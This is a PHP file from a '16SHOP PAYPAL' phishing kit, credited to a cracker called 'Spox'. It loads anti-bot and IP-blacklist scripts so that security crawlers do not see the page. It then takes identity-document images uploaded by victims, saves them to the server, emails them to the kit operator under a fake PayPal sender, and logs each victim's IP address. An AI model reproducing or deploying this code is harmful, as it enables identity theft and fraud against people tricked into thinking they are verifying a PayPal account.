<?php

/**
 * 16SHOP PAYPAL CRACKED BY SPOX
 * icq & telegram = @spoxcoder
 
###############################################
#$            CRACKED by Spox_dz             $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 16SHOP            $#
###############################################

**/


error_reporting(0);
session_start();
include'../Spox/Anti/IP-BlackList.php';  
include'../Spox/Anti/Bot-Crawler.php';
include'../Spox/Anti/Bot-Spox.php';
include'../Spox/Functions/Fuck-you.php'; 
include'../Spox/Anti/Dila_DZ.php';
require_once '../main.php';
require_once 'session.php';
include'../Spox/spox_config.php';

if(isset($_POST['doc_type'])&&isset($_POST['images'])){
	function upImg($vl){
		$t=microtime(true);
		$micro=sprintf("%06d",($t - floor($t))* 1000000);
		$today=date("m.d.y.h.i.s.U".$micro,$t);
		$name=hash('md5',$today);
		$type=explode(';',$vl)[0];
		$type='.'.explode('/',$type)[1];
		file_put_contents('../pap/'.$name.$type,base64_decode(explode(',',$vl)[1]));
		return "../pap/".$name.$type;
	}
	$from = $_SESSION['from'];
	$type = $_POST['doc_type'];
    $subject = "DOCUMENT: $from - $type [ $cn - $os - $ip ]";

	for($i=0;$i<count($_POST['images']);$i++){
	$headers="From: ".$_SESSION['from']." <paypal_spox@cracked.16shop>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($email,$subject,upImg($_POST['images'][$i]),$headers);

	}
	tulis_file("../result/total_upload.txt", $ip);
	exit("done");
}